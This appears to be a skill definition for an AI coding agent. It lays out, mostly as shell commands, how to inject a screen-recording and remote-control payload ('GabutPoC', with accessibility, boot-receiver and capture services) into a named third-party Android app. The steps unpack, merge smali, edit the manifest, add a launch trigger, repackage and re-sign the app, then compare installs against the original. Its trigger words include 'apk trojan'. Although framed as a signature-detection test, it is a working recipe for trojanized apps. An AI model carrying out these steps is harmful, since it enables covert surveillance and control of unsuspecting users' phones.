---
name: apk-injection-sign-detection
description: Gunakan untuk injeksi GabutPoC ke GOL APK dan uji sign detection Android. Mencakup unpack APK target (GOL), merge smali payload (GabutPoC), update manifest, repackage, sign ulang, dan test instalasi (fresh vs update).

trigger:
  patterns:
    - inject gabutpoc
    - penanaman apk
    - repackage apk
    - sign detection
    - gol injection
    - apk trojan
    - merge dex
    - signature mismatch
    - ganti certificate apk
  keywords:
    - apktool
    - smali
    - AndroidManifest
    - apksigner
    - INSTALL_FAILED_UPDATE_INCOMPATIBLE
    - SIGNATURE_MISMATCH
    - Play Protect
    - com.kpk.gol
    - com.example.screenwhip
    - KioskControlService
    - ScreenCaptureService
    - ForcedH264Encoder
    - BootReceiver
    - WhipClient
---

# APK Injection & Sign Detection

## Context
GabutPoC (screen recording + remote control via WebRTC) ditanam ke GOL APK (com.kpk.gol, Cordova+Firebase).
APK GOL asli sudah dianalisis (jadx decompile). Server SRS + relay + dashboard sudah berjalan.
Tujuan: inject payload, repackage, sign dengan debug key, lalu test sign detection Android.

## Quick Start

```bash
# 1. Unpack target GOL APK
apktool d com.kpk.gol.apk -o gol_unpacked -f

# 2. Unpack payload GabutPoC
apktool d app-x86_64-debug.apk -o gabutpoc_unpacked -f

# 3. Merge smali
cp -r gabutpoc_unpacked/smali/com/example/screenwhip gol_unpacked/smali/
cp gabutpoc_unpacked/smali/org/webrtc/ForcedH264Encoder* gol_unpacked/smali/org/webrtc/

# 4. Copy resource accessibility config
cp gabutpoc_unpacked/res/xml/accessibility_service_config.xml gol_unpacked/res/xml/

# 5. Edit AndroidManifest.xml — tambah permissions & service & receiver

# 6. Inject trigger di MainActivity smali — panggil BootReceiver.scheduleStart()

# 7. Repackage
apktool b gol_unpacked -o gol_modified.apk

# 8. Sign
apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android --key-pass pass:android gol_modified.apk

# 9. Test sign detection
adb install com.kpk.gol.apk              # Install original → success
adb install -r gol_modified.apk          # Update → SIGNATURE_MISMATCH
adb uninstall com.kpk.gol
adb install gol_modified.apk             # Fresh install → success (debug sign)
```

## Key Files
| File | Path |
|------|------|
| GOL APK | `com.kpk.gol.apk` |
| GabutPoC APK | `../Lab-1/android/app/build/outputs/apk/debug/app-x86_64-debug.apk` |
| Injection docs | `docs/injection.md` |
| GOL analysis | `docs/GOL-APK.md` |
| GabutPoC arch | `docs/GabutPoC.md` |
| Inject skill | `skills/apk-inject.yaml` |
| Sign check skill | `skills/sign-check.yaml` |
| Extract tool | `tools/extract-apk.ps1` |
| Sign check tool | `tools/sign-check.ps1` |

## Expected Results
| Scenario | Result |
|----------|--------|
| Install original | Success |
| Modified over original | `INSTALL_FAILED_UPDATE_INCOMPATIBLE` — signature mismatch |
| Modified fresh install | Success (debug key) |
| Play Protect scan | Flag as spyware |
| Google Play Integrity | Failed (not Play Store signature) |
